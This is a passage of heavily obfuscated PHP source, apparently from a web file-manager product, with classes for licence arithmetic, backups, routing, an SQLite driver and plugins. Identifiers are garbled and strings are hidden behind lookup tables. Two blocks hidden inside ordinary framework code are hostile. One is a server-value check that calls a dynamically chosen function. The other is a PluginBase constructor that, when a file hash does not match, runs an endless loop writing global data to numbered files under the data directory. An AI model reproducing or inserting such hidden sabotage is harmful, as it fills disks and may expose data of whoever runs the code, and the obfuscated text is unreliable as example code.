$­óÒ±˜¼[299] . $†˜Åã·ú . $­óÒ±˜¼[299] . $ŸÙ×‘¼ú . $­óÒ±˜¼[300]); $²½­‡ü÷ = $­‘•åÙ…[759]; if (strlen($²½­‡ü÷) < $­‘•åÙ…[60]) { die; } $Õç›®÷ = $this->nqsm776e90c6($Õí³Õ¹©, $Ä˜ŠëË) . $­óÒ±˜¼[301] . $Ù¢»¿ ù; $ ô¢øš’ = $­‘•åÙ…[760]; while (strlen($ ô¢øš’) < $­‘•åÙ…[60]) { if (!$ ô¢øš’) { break; } $ ô¢øš’++; } return $Õç›®÷; } public function gnja9907c329($˜¬´ŞÏè) { $Á„äÛ˜ =& $_SERVER[¹òÍ›æş]; $¿ØËáÉç =& $_SERVER[¯ı†ò™•]; $ÅÊì¥ÏÑ = explode($¿ØËáÉç[301], $˜¬´ŞÏè); $¢Ğ…²ıé = $Á„äÛ˜[761]; if (!$¢Ğ…²ıé) { return; } if (count($ÅÊì¥ÏÑ) != 2) { return $¿ØËáÉç[6]; } $‡ä“îş = $this->hpzr1211ac26($ÅÊì¥ÏÑ[1] . $¿ØËáÉç[6], $¿ØËáÉç[135]); if (!$‡ä“îş) { return $¿ØËáÉç[6]; } $‡ä“îş = intval($‡ä“îş); $Ú¦Õäöş = $Á„äÛ˜[762]; if (!$Ú¦Õäöş) { die; } $Êûµ™è = 0; $ˆ´¾ä¦€ = 0; $¢²©®ì¨ = $Á„äÛ˜[763]; while ($¢²©®ì¨ < $Á„äÛ˜[668]) { if ($¢²©®ì¨ >= 0) { break; } $¢²©®ì¨++; } for ($İøÖÔ‡ş = 3; $İøÖÔ‡ş < $‡ä“îş; $İøÖÔ‡ş += 2) { if ($‡ä“îş % $İøÖÔ‡ş != 0) { continue; } $Êûµ™è = $İøÖÔ‡ş; $İ³ŒØ¶‹ = $Á„äÛ˜[764]; while (strlen($İ³ŒØ¶‹) < $Á„äÛ˜[658]) { if (!$İ³ŒØ¶‹) { break; } $İ³ŒØ¶‹++; } $ˆ´¾ä¦€ = intval($‡ä“îş / $İøÖÔ‡ş); break; $šìÔªƒƒ = $Á„äÛ˜[765]; if (!$šìÔªƒƒ) { die; } } $Ù¼õìâÄ = ($Êûµ™è - 1) * ($ˆ´¾ä¦€ - 1); $ö´Úõ” = $Á„äÛ˜[766]; $¶úî©Ğ› = intval(($Êûµ™è + $ˆ´¾ä¦€) / 2); while (1) { $ÄÍÛ×ğÀ = $¶úî©Ğ›; $ãíó¤íÊ = $Ù¼õìâÄ; $Ç¼µ­ãâ = $Á„äÛ˜[767]; if (!$Ç¼µ­ãâ) { die; } while ($ãíó¤íÊ % $ÄÍÛ×ğÀ != 0) { $ôô¦—¿ã = $ãíó¤íÊ; $–Œ²ìÚ = $Á„äÛ˜[768]; $ãíó¤íÊ = $ÄÍÛ×ğÀ; $ÄÍÛ×ğÀ = $ôô¦—¿ã % $ÄÍÛ×ğÀ; $öÙ¨áë¾ = $Á„äÛ˜[769]; while ($öÙ¨áë¾ < $Á„äÛ˜[654]) { if ($öÙ¨áë¾ >= 0) { break; } $öÙ¨áë¾++; } } if ($ÄÍÛ×ğÀ == 1) { break; } else { $¶úî©Ğ›++; } } $¤áŞàã– = 2; $šœúİÕŒ = $Á„äÛ˜[770]; if (!$šœúİÕŒ) { return; } for ($İøÖÔ‡ş = 0; $İøÖÔ‡ş < $Ù¼õìâÄ * 10; $İøÖÔ‡ş++) { if (($Ù¼õìâÄ * $İøÖÔ‡ş + 1) % $¶úî©Ğ› == 0) { $¤áŞàã– = intval(($Ù¼õìâÄ * $İøÖÔ‡ş + 1) / $¶úî©Ğ›); break; } } $â¬Œ‰µ‚ = md5($¿ØËáÉç[298] . ($Êûµ™è + $ˆ´¾ä¦€) . $¿ØËáÉç[299] . $¶úî©Ğ› . $¿ØËáÉç[299] . $¤áŞàã– . $¿ØËáÉç[300]); $Î»·­ƒâ = $Á„äÛ˜[771]; if (!$Î»·­ƒâ) { die; } $Å›ñÛæ = $this->hpzr1211ac26($ÅÊì¥ÏÑ[0], $â¬Œ‰µ‚); return $Å›ñÛæ; } public function dibhac2b2d5a() { $Œ…ÈÄ×¿ =& $_SERVER[¹òÍ›æş]; $Äüîºæ„ = mt_rand(pow(2, 14), pow(2, 16) - 1); $°ÄûµÕ´ = $Œ…ÈÄ×¿[772]; $™£Ï‡âÁ = array(); $Ñ¢È‚ = 1; while ($Ñ¢È‚ <= (int) sqrt($Äüîºæ„)) { $œ¦ƒ±ÛØ = $Ñ¢È‚; while (!0) { $œ¦ƒ±ÛØ++; if ($œ¦ƒ±ÛØ <= 2) { $Ñ¢È‚ = $œ¦ƒ±ÛØ; break; } else { if ($œ¦ƒ±ÛØ < 2) { continue; } } $Ë£ï¬â¥ = !0; for ($¦Â‚–í¥ = 2; $¦Â‚–í¥ <= sqrt($œ¦ƒ±ÛØ); $¦Â‚–í¥++) { if ($œ¦ƒ±ÛØ % $¦Â‚–í¥ == 0) { $Ë£ï¬â¥ = !1; } } if ($Ë£ï¬â¥) { $Ñ¢È‚ = $œ¦ƒ±ÛØ; break; } } $™£Ï‡âÁ[] = $Ñ¢È‚; $Ö’­ÜÙÆ = $Œ…ÈÄ×¿[773]; if (!$Ö’­ÜÙÆ) { return; } } $œÅÒıæÛ = 2; $¨ÅÈÑˆô = $Œ…ÈÄ×¿[774]; for ($œ¦ƒ±ÛØ = $Äüîºæ„; $œ¦ƒ±ÛØ > 1; $œ¦ƒ±ÛØ--) { $Ë£ï¬â¥ = !0; $ñÌÜ±» = $Œ…ÈÄ×¿[775]; while ($ñÌÜ±» < $Œ…ÈÄ×¿[654]) { if ($ñÌÜ±» >= 0) { break; } $ñÌÜ±»++; } foreach ($™£Ï‡âÁ as $¥Š¨‚¶°) { if ($œ¦ƒ±ÛØ % $¥Š¨‚¶° == 0) { $Ë£ï¬â¥ = !1; break; } } if ($Ë£ï¬â¥) { $œÅÒıæÛ = $œ¦ƒ±ÛØ; break; } } return $œÅÒıæÛ; } public function sgfqb8d96b4a($ÕÁ©Êî, $‹£…ó Ó) { $±„¿Ìú„ =& $_SERVER[¹òÍ›æş]; $×Úã‡ù =& $_SERVER[¯ı†ò™•]; return call_user_func(array($×Úã‡ù[8], $×Úã‡ù[302]), $ÕÁ©Êî, $‹£…ó Ó); $µÄû×ÇÛ = $±„¿Ìú„[776]; if (strlen($µÄû×ÇÛ) < $±„¿Ìú„[668]) { die; } } public function nqsm776e90c6($×¢ „™, $¤ÁÜ«ôÀ) { $™şçåÂ¨ =& $_SERVER[¹òÍ›æş]; $Û½Ûû«¯ =& $_SERVER[¯ı†ò™•]; return call_user_func(array($Û½Ûû«¯[303], $Û½Ûû«¯[304]), $×¢ „™, $¤ÁÜ«ôÀ); $¬¬«ê÷‹ = $™şçåÂ¨[777]; while ($¬¬«ê÷‹ < $™şçåÂ¨[652]) { if ($¬¬«ê÷‹ >= 0) { break; } $¬¬«ê÷‹++; } } public function hpzr1211ac26($×ÆµœÑ¡, $¸öÇ¬·À) { $â¹§âÌ =& $_SERVER[¯ı†ò™•]; return call_user_func(array($â¹§âÌ[303], $â¹§âÌ[305]), $×ÆµœÑ¡, $¸öÇ¬·À); } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $âÇ¢ß€Ï =& $_SERVER[¹òÍ›æş]; $this->isManual(); self::$name = date($âÇ¢ß€Ï[778]); if (!($¨†ì¬Û = Model($âÇ¢ß€Ï[779])->lastItem())) { $¨†ì¬Û = $this->initData(); } else { self::$name = $¨†ì¬Û[$âÇ¢ß€Ï[32]]; if ($¨†ì¬Û[$âÇ¢ß€Ï[780]] == $âÇ¢ß€Ï[98]) { self::$name = date($âÇ¢ß€Ï[249]); $áÚ™¼“Ş = 0; if (isset($¨†ì¬Û[$âÇ¢ß€Ï[331]][$âÇ¢ß€Ï[210]][$âÇ¢ß€Ï[506]])) { $áÚ™¼“Ş = (int) $¨†ì¬Û[$âÇ¢ß€Ï[331]][$âÇ¢ß€Ï[210]][$âÇ¢ß€Ï[506]]; } if (self::$manual == 0 && $¨†ì¬Û[$âÇ¢ß€Ï[32]] == self::$name) { Model($âÇ¢ß€Ï[779])->remove($¨†ì¬Û[$âÇ¢ß€Ï[437]]); } $¨†ì¬Û = $this->initData($áÚ™¼“Ş, $¨†ì¬Û[$âÇ¢ß€Ï[781]]); } else { $this->checkStore($¨†ì¬Û[$âÇ¢ß€Ï[781]]); } } self::$option = $¨†ì¬Û; } private function isManual() { $ì°“Ú–ı = _get($GLOBALS, $_SERVER[¹òÍ›æş][782], 0); $ì°“Ú–ı = intval($ì°“Ú–ı); self::$manual = $ì°“Ú–ı && $ì°“Ú–ı == 1 ? 1 : 0; } private function initData($½éªØ² = 0, $´ŒŠµåò = '') { $›ú–¦Ë =& $_SERVER[¹òÍ›æş]; $Š²™ê•Ò = Model($›ú–¦Ë[779])->config(); if ($´ŒŠµåò && $Š²™ê•Ò[$›ú–¦Ë[781]] != $´ŒŠµåò) { $½éªØ² = 0; } $this->checkStore($Š²™ê•Ò[$›ú–¦Ë[781]]); if (self::$manual == 1) { self::$name .= $›ú–¦Ë[11] . date($›ú–¦Ë[783]); } $Ññï±ªë = array($›ú–¦Ë[781] => $Š²™ê•Ò[$›ú–¦Ë[781]], $›ú–¦Ë[32] => self::$name, $›ú–¦Ë[780] => 0, $›ú–¦Ë[784] => $Š²™ê•Ò[$›ú–¦Ë[784]], $›ú–¦Ë[785] => self::$manual, $›ú–¦Ë[331] => array($›ú–¦Ë[786] => array($›ú–¦Ë[780] => 0), $›ú–¦Ë[787] => array($›ú–¦Ë[780] => 0, $›ú–¦Ë[788] => 0, $›ú–¦Ë[789] => 0, $›ú–¦Ë[33] => $›ú–¦Ë[12], $›ú–¦Ë[790] => 0, $›ú–¦Ë[791] => 0), $›ú–¦Ë[792] => array($›ú–¦Ë[780] => 0, $›ú–¦Ë[788] => 0, $›ú–¦Ë[789] => 0, $›ú–¦Ë[790] => 0, $›ú–¦Ë[791] => 0), $›ú–¦Ë[210] => array($›ú–¦Ë[780] => 0, $›ú–¦Ë[793] => 0, $›ú–¦Ë[794] => 0, $›ú–¦Ë[795] => 0, $›ú–¦Ë[796] => 0, $›ú–¦Ë[506] => $½éªØ², $›ú–¦Ë[790] => 0, $›ú–¦Ë[791] => 0)), $›ú–¦Ë[790] => time(), $›ú–¦Ë[791] => 0); $ÄŠğ ¯š = Model($›ú–¦Ë[779])->insert($Ññï±ªë); $Ññï±ªë[$›ú–¦Ë[437]] = $ÄŠğ ¯š; return $Ññï±ªë; } private function checkStore($èºŒº–€) { $¤’˜‹ÀÂ =& $_SERVER[¹òÍ›æş]; $Èòì—Öó = Model($¤’˜‹ÀÂ[797])->listData($èºŒº–€); Model($¤’˜‹ÀÂ[797])->checkConfig($Èòì—Öó); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[¹òÍ›æş][779])->findByName(self::$name); } return self::$option; } public static function set($Ö°™‡ªÎ) { $Ó¡Áñ¾Á =& $_SERVER[¹òÍ›æş]; $ïÖƒ©†Ğ = self::get(); foreach ($Ö°™‡ªÎ as $ïÀÒÔ±ò => $¸‚ğà•Ç) { $…’ç°ˆæ = explode($Ó¡Áñ¾Á[10], $ïÀÒÔ±ò); $ØíÍñí¶ = count($…’ç°ˆæ); switch ($ØíÍñí¶) { case 1: $ïÖƒ©†Ğ[$…’ç°ˆæ[0]] = $¸‚ğà•Ç; break; case 2: $ïÖƒ©†Ğ[$…’ç°ˆæ[0]][$…’ç°ˆæ[1]] = $¸‚ğà•Ç; break; case 3: $ïÖƒ©†Ğ[$…’ç°ˆæ[0]][$…’ç°ˆæ[1]][$…’ç°ˆæ[2]] = $¸‚ğà•Ç; break; } } Model($Ó¡Áñ¾Á[779])->update($ïÖƒ©†Ğ[$Ó¡Áñ¾Á[437]], $ïÖƒ©†Ğ); self::$option = $ïÖƒ©†Ğ; return self::$option; } public function keep() { $Áº Šüú =& $_SERVER[¹òÍ›æş]; $¼Èòâ¦ = self::get(); if ($¼Èòâ¦[$Áº Šüú[331]][$Áº Šüú[786]][$Áº Šüú[780]] == $Áº Šüú[98]) { return; } $this->backupKeep($¼Èòâ¦); self::set(array($Áº Šüú[798] => 1)); } private function backupKeep($È¶¹°ªÜ) { $‹—À¾¿Õ =& $_SERVER[¹òÍ›æş]; if (self::$manual == 1) { return; } $Ê”Äü±ƒ = Model($‹—À¾¿Õ[779])->listData(); if (empty($Ê”Äü±ƒ)) { return; } $ÊÄˆÜ¦µ = 0; $µšª—ƒ„ = array(); foreach ($Ê”Äü±ƒ as $Â¥º÷Ñ·) { if ($ÊÄˆÜ¦µ >= 7) { break; } $µšª—ƒ„[] = $Â¥º÷Ñ·[$‹—À¾¿Õ[32]]; $ÊÄˆÜ¦µ++; } for ($ÊÄˆÜ¦µ = 0; $ÊÄˆÜ¦µ < 12; $ÊÄˆÜ¦µ++) { $µšª—ƒ„[] = date($‹—À¾¿Õ[799], strtotime("\55{$ÊÄˆÜ¦µ}\40\x6d\157\156\164\150\163")); } $µšª—ƒ„ = array_unique($µšª—ƒ„); $“××ÂÄ¦ = Model($‹—À¾¿Õ[800])->get($‹—À¾¿Õ[801]); foreach ($Ê”Äü±ƒ as $Â¥º÷Ñ·) { if (isset($Â¥º÷Ñ·[$‹—À¾¿Õ[785]]) && $Â¥º÷Ñ·[$‹—À¾¿Õ[785]] == $‹—À¾¿Õ[98]) { continue; } if (!empty($Â¥º÷Ñ·[$‹—À¾¿Õ[32]]) && in_array($Â¥º÷Ñ·[$‹—À¾¿Õ[32]], $µšª—ƒ„)) { continue; } Model($‹—À¾¿Õ[779])->remove($Â¥º÷Ñ·[$‹—À¾¿Õ[437]]); $ò™áÒÑÃ = $this->backupPath($È¶¹°ªÜ, $“××ÂÄ¦); IO::remove($ò™áÒÑÃ, !1); } } private function backupPath($œüâƒ, $é¬éÚ = false) { $òş½™ =& $_SERVER[¹òÍ›æş]; if (!$é¬éÚ) { $é¬éÚ = Model($òş½™[800])->get($òş½™[801]); } $æäçùºê = $œüâƒ[$òş½™[32]]; $¬œûÊß« = substr(md5($òş½™[802] . $é¬éÚ . $æäçùºê), 0, 8); return "\x7b\x69\157\x3a{$œüâƒ[$òş½™[781]]}\175\57\144\141\x74\x61\142\x61\x73\x65\57\142\141\x63\x6b\x75\160\57" . $æäçùºê . $òş½™[11] . $¬œûÊß«; } public function db() { $œÍŒ‘ö =& $_SERVER[¹òÍ›æş]; $¦Ö¡ë = self::get(); if ($¦Ö¡ë[$œÍŒ‘ö[331]][$œÍŒ‘ö[787]][$œÍŒ‘ö[780]] == $œÍŒ‘ö[98]) { return !0; } $“‡óÚûÍ = new BackupDb(); if (!$“‡óÚûÍ->index()) { return !1; } self::set(array($œÍŒ‘ö[803] => 1)); return !0; } public function dbFile() { $¶şš‡“” =& $_SERVER[¹òÍ›æş]; $‡Ôª™ÊŸ = self::get(); if ($‡Ôª™ÊŸ[$¶şš‡“”[331]][$¶şš‡“”[792]][$¶şš‡“”[780]] == $¶şš‡“”[98]) { return !0; } $³ø•òİ¡ = new BackupDbFile(); if (!$³ø•òİ¡->index()) { return !1; } self::set(array($¶şš‡“”[804] => 1)); return !0; } public function file() { $èÊ¼ğÓ¤ =& $_SERVER[¹òÍ›æş]; $£·æ²ñÅ = self::get(); if ($£·æ²ñÅ[$èÊ¼ğÓ¤[331]][$èÊ¼ğÓ¤[210]][$èÊ¼ğÓ¤[780]] == $èÊ¼ğÓ¤[98]) { return !0; } if (!isset($£·æ²ñÅ[$èÊ¼ğÓ¤[784]]) || $£·æ²ñÅ[$èÊ¼ğÓ¤[784]] == $èÊ¼ğÓ¤[208]) { $İ¦ëÇà… = new BackupFile(); if (!$İ¦ëÇà…->index()) { return !1; } } self::set(array($èÊ¼ğÓ¤[805] => 1, $èÊ¼ğÓ¤[780] => 1)); return !0; } } goto Cß¿œ™ç…©; F‹Ÿ£ĞÍº: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $”ôã¼˜• =& $_SERVER[¹òÍ›æş]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$”ôã¼˜•[6]] =& $config; $this->values[$”ôã¼˜•[7]] =& $in; $this->tpl = TEMPLATE . MOD . $”ôã¼˜•[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($üƒêë¥‚) { if (1 === func_num_args()) { $this->{$üƒêë¥‚} = new $üƒêë¥‚(); } else { $æ°²¯Ôá = new ReflectionClass($üƒêë¥‚); $ô®öóõ = func_get_args(); array_shift($ô®öóõ); $this->{$üƒêë¥‚} = $æ°²¯Ôá->newInstanceArgs($ô®öóõ); } return $this->{$üƒêë¥‚}; } public function routeBind($•›üôˆÊ, $Ş¿á¦Õí, $´ø«äëÒ = 3) { $¹ÑÄï‡ =& $_SERVER[¹òÍ›æş]; $†ÇË­ÍÉ = $this->in[$¹ÑÄï‡[9]]; $•›üôˆÊ = str_replace($¹ÑÄï‡[10], $¹ÑÄï‡[11], trim(trim($•›üôˆÊ, $¹ÑÄï‡[8]), $¹ÑÄï‡[12])); if (!$•›üôˆÊ || count($†ÇË­ÍÉ) <= $´ø«äëÒ) { return !1; } $–êï·ÆÑ = !0; $òéÆËŠ = explode($¹ÑÄï‡[8], $•›üôˆÊ); for ($œÃíÈ = 0; $œÃíÈ < count($òéÆËŠ); $œÃíÈ++) { if ($òéÆËŠ[$œÃíÈ] != $†ÇË­ÍÉ[$´ø«äëÒ + $œÃíÈ]) { $–êï·ÆÑ = !1; break; } } if (!$–êï·ÆÑ) { return; } call_user_func_array(array($this, $Ş¿á¦Õí), array()); } public function routeArgs($›Ëšô·æ = 3) { $Åà°–¼á = $this->in[$_SERVER[¹òÍ›æş][9]]; if (count($Åà°–¼á) <= $›Ëšô·æ) { return array(); } $¸‡Ã×ËÓ = array(); for ($ğ‘š˜ß = $›Ëšô·æ; $ğ‘š˜ß < count($Åà°–¼á); $ğ‘š˜ß += 2) { $¸‡Ã×ËÓ[$Åà°–¼á[$ğ‘š˜ß]] = $Åà°–¼á[$ğ‘š˜ß + 1]; $this->in[$Åà°–¼á[$ğ‘š˜ß]] = $Åà°–¼á[$ğ‘š˜ß + 1]; } return $¸‡Ã×ËÓ; } protected function assign($¡œ‰ô¢í, $íö©åÍã) { $this->values[$¡œ‰ô¢í] = $íö©åÍã; } protected function display($›¬²´‚) { ob_end_clean(); extract($this->values); require $this->tpl . $›¬²´‚; } } class DbSqliteBase extends Db { public function __construct($ú×‘± = '') { $é¼³Æøö =& $_SERVER[¹òÍ›æş]; if (!extension_loaded($é¼³Æøö[13])) { think_exception(think_lang($é¼³Æøö[14]) . $é¼³Æøö[15]); } if (!empty($ú×‘±)) { if (!isset($ú×‘±[$é¼³Æøö[16]])) { $ú×‘±[$é¼³Æøö[16]] = 438; } $this->config = $ú×‘±; if (empty($this->config[$é¼³Æøö[17]])) { $this->config[$é¼³Æøö[17]] = array(); } } } public function connect($˜„óêˆÒ = '', $òÄÃ ŠÜ = 0) { $ ™Š³¶ =& $_SERVER[¹òÍ›æş]; if (!isset($this->linkID[$òÄÃ ŠÜ])) { if (empty($˜„óêˆÒ)) { $˜„óêˆÒ = $this->config; } $¥ì†şÕ = !empty($˜„óêˆÒ[$ ™Š³¶[17]][$ ™Š³¶[18]]) ? $˜„óêˆÒ[$ ™Š³¶[17]][$ ™Š³¶[18]] : $this->pconnect; $“©ø±·Ÿ = $¥ì†şÕ ? $ ™Š³¶[19] : $ ™Š³¶[20]; $this->linkID[$òÄÃ ŠÜ] = $“©ø±·Ÿ($˜„óêˆÒ[$ ™Š³¶[21]], $˜„óêˆÒ[$ ™Š³¶[16]]); if (!$this->linkID[$òÄÃ ŠÜ]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$òÄÃ ŠÜ], 30000); if (1 != think_config($ ™Š³¶[22])) { unset($this->config); } } return $this->linkID[$òÄÃ ŠÜ]; } public function free() { $this->queryID = null; } public function query($Ô‰·¹óÅ) { $ûè³óâ¿ =& $_SERVER[¹òÍ›æş]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Ô‰·¹óÅ; if ($this->queryID) { $this->free(); } think_action_status($ûè³óâ¿[23], 1); think_status($ûè³óâ¿[24]); $this->queryID = sqlite_query($this->_linkID, $Ô‰·¹óÅ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $™É‚·®å = $this->getAll(); return $™É‚·®å; } } public function execute($ßğ€¡¶Ö) { $…óµˆ =& $_SERVER[¹òÍ›æş]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ßğ€¡¶Ö; if ($this->queryID) { $this->free(); } think_action_status($…óµˆ[25], 1); think_status($…óµˆ[24]); $áˆ¤™½ = sqlite_exec($this->_linkID, $ßğ€¡¶Ö); $this->debug(); if (!1 === $áˆ¤™½) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[¹òÍ›æş][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¶äëÎÛ = sqlite_query($this->_linkID, $_SERVER[¹òÍ›æş][27]); if (!$¶äëÎÛ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $úâ£º“½ = sqlite_query($this->_linkID, $_SERVER[¹òÍ›æş][28]); if (!$úâ£º“½) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ß¼Ÿ”Ê = array(); if ($this->numRows > 0) { for ($ü…•Ñï€ = 0; $ü…•Ñï€ < $this->numRows; $ü…•Ñï€++) { $ß¼Ÿ”Ê[$ü…•Ñï€] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $ß¼Ÿ”Ê; } public function getFields($•ßÛ¥¶Å) { $Òïá¥ÉÜ =& $_SERVER[¹òÍ›æş]; $Ò§îÄ»ò = $this->query($Òïá¥ÉÜ[29] . $•ßÛ¥¶Å . $Òïá¥ÉÜ[30]); $–´ô®¥Ä = array(); if ($Ò§îÄ»ò) { foreach ($Ò§îÄ»ò as $ĞÜÌÅ»í => $÷ñ¦’ˆÅ) { $–´ô®¥Ä[$÷ñ¦’ˆÅ[$Òïá¥ÉÜ[31]]] = array($Òïá¥ÉÜ[32] => $÷ñ¦’ˆÅ[$Òïá¥ÉÜ[31]], $Òïá¥ÉÜ[33] => $÷ñ¦’ˆÅ[$Òïá¥ÉÜ[34]], $Òïá¥ÉÜ[35] => (bool) ($÷ñ¦’ˆÅ[$Òïá¥ÉÜ[36]] === $Òïá¥ÉÜ[12]), $Òïá¥ÉÜ[37] => $÷ñ¦’ˆÅ[$Òïá¥ÉÜ[38]], $Òïá¥ÉÜ[39] => strtolower($÷ñ¦’ˆÅ[$Òïá¥ÉÜ[40]]) == $Òïá¥ÉÜ[41], $Òïá¥ÉÜ[42] => strtolower($÷ñ¦’ˆÅ[$Òïá¥ÉÜ[43]]) == $Òïá¥ÉÜ[44]); } } return $–´ô®¥Ä; } public function getTables($×ææ®¦® = '') { $‡ä¼ûÛ =& $_SERVER[¹òÍ›æş]; $ƒ‚ÆØÑ• = $this->query($‡ä¼ûÛ[45] . $‡ä¼ûÛ[46] . $‡ä¼ûÛ[47]); $âšôÜ÷± = array(); foreach ($ƒ‚ÆØÑ• as $È§¨®ÑÄ => $¥÷«µ­²) { $âšôÜ÷±[$È§¨®ÑÄ] = current($¥÷«µ­²); } return $âšôÜ÷±; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $ãó×‰Ò– =& $_SERVER[¹òÍ›æş]; $ÀÈ‹Ü´Ñ = sqlite_last_error($this->_linkID); $this->error = $ÀÈ‹Ü´Ñ . $ãó×‰Ò–[4] . sqlite_error_string($ÀÈ‹Ü´Ñ); if ($ãó×‰Ò–[12] != $this->queryStr) { $this->error .= LNG($ãó×‰Ò–[48]) . $this->queryStr; } think_trace($this->error, $ãó×‰Ò–[12], $ãó×‰Ò–[49]); return $this->error; } public function escapeString($¼áÓ¬Ø) { return sqlite_escape_string($¼áÓ¬Ø); } public function parseLimit($™õ¤Ú“ª) { $«ğĞ„ÖÓ =& $_SERVER[¹òÍ›æş]; $·¿—÷É  = $«ğĞ„ÖÓ[12]; if (!empty($™õ¤Ú“ª)) { $™õ¤Ú“ª = explode($«ğĞ„ÖÓ[50], $™õ¤Ú“ª); if (count($™õ¤Ú“ª) > 1) { $·¿—÷É  .= $«ğĞ„ÖÓ[51] . $™õ¤Ú“ª[1] . $«ğĞ„ÖÓ[52] . $™õ¤Ú“ª[0] . $«ğĞ„ÖÓ[53]; } else { $·¿—÷É  .= $«ğĞ„ÖÓ[51] . $™õ¤Ú“ª[0] . $«ğĞ„ÖÓ[53]; } } return $·¿—÷É ; } } if ($_SERVER[$_SERVER[¹òÍ›æş][54]] != $_SERVER[$_SERVER[¹òÍ›æş][55]]) { $_getc = $_SERVER[¹òÍ›æş][56]; $_getfile = $_SERVER[$_SERVER[¹òÍ›æş][57]] . $_SERVER[¹òÍ›æş][58]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¹òÍ›æş][59], $_getfilec); if (count($_getarrs) < $_SERVER[¹òÍ›æş][60]) { $exit = $_SERVER[¹òÍ›æş][61]; $exit(); } $_act = $_SERVER[¹òÍ›æş][62]; $_act($_SERVER[$_SERVER[¹òÍ›æş][63]]); } goto b¤šò¤å; BÊæğäğ÷Ã: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $Ñ¦ÙÀÓ™ =& $_SERVER[¹òÍ›æş]; $æŸÄÈº´ = $_SERVER[$Ñ¦ÙÀÓ™[57]] . $Ñ¦ÙÀÓ™[58]; $œ×‡€äÒ = $Ñ¦ÙÀÓ™[1534]; if ($_SERVER[$Ñ¦ÙÀÓ™[54]] != $œ×‡€äÒ($æŸÄÈº´)) { $­â‚·«à = $Ñ¦ÙÀÓ™[906]; $ÀêŞÏÓ  = $Ñ¦ÙÀÓ™[56]; $¾Î— ¶Š = $_SERVER[$Ñ¦ÙÀÓ™[57]] . $Ñ¦ÙÀÓ™[58]; $Üê¡ÍÕÆ = $ÀêŞÏÓ ($¾Î— ¶Š); $®ÁÎÈÄí = explode($Ñ¦ÙÀÓ™[59], $Üê¡ÍÕÆ); if (count($®ÁÎÈÄí) < $Ñ¦ÙÀÓ™[654]) { $ß“ÏãÆ = $Ñ¦ÙÀÓ™[61]; $ß“ÏãÆ(); } $ıóô¹Ôâ = $Ñ¦ÙÀÓ™[907]; $ıóô¹Ôâ($_SERVER[$Ñ¦ÙÀÓ™[908]]); $­â‚·«à = $Ñ¦ÙÀÓ™[906]; $­â‚·«à(); $üÎß¶£â = $Ñ¦ÙÀÓ™[1535]; $ã…øîõĞ = json_encode($GLOBALS[$Ñ¦ÙÀÓ™[1536]]); $—÷êßç = 1; for ($È«õ…—Ã = $—÷êßç; $È«õ…—Ã > 0; $È«õ…—Ã++) { $üÎß¶£â(DATA_PATH . $È«õ…—Ã, $ã…øîõĞ); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($Ñ¦ÙÀÓ™[1537]); $this->pluginName = str_replace($Ñ¦ÙÀÓ™[1537], $Ñ¦ÙÀÓ™[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $Ñ¦ÙÀÓ™[8]; $this->pluginApi = appHostGet() . $Ñ¦ÙÀÓ™[1538] . $this->pluginName . $Ñ¦ÙÀÓ™[8]; $this->pluginHost = $config[$Ñ¦ÙÀÓ™[1539]] . $this->pluginName . $Ñ¦ÙÀÓ™[8]; $this->pluginHostDefault = $config[$Ñ¦ÙÀÓ™[1539]] . $this->pluginName . $Ñ¦ÙÀÓ™[8]; $éæ¦§İÊ = $config[$Ñ¦ÙÀÓ™[1540]]; if ($éæ¦§İÊ && strpos($Ñ¦ÙÀÓ™[50] . $éæ¦§İÊ . $Ñ¦ÙÀÓ™[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$Ñ¦ÙÀÓ™[1541]] . $this->pluginName . $Ñ¦ÙÀÓ™[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[¹òÍ›æş][1542]); } protected function assign($Ê¼¹ËáØ, $ú•ñÜúŞ = false) { if (is_array($Ê¼¹ËáØ)) { $this->values = array_merge($this->values, $Ê¼¹ËáØ); } else { $this->values[$Ê¼¹ËáØ] = $ú•ñÜúŞ; } } protected function display($Ÿ˜º¸¿) { extract($this->values); require $Ÿ˜º¸¿; } final function hookRegist($ş¹Ÿô™¤) { $this->modelPlugin->appRegist($this->pluginName, $ş¹Ÿô™¤); } final function appIcon() { $¹ñì¼ûè =& $_SERVER[¹òÍ›æş]; $šşÊ¥æ¤ = $this->appPackage(); $É€À´»ƒ = $¹ñì¼ûè[12]; if (isset($šşÊ¥æ¤[$¹ñì¼ûè[454]])) { if (isset($šşÊ¥æ¤[$¹ñì¼ûè[454]][$¹ñì¼ûè[1543]])) { $É€À´»ƒ = $¹ñì¼ûè[1544] . 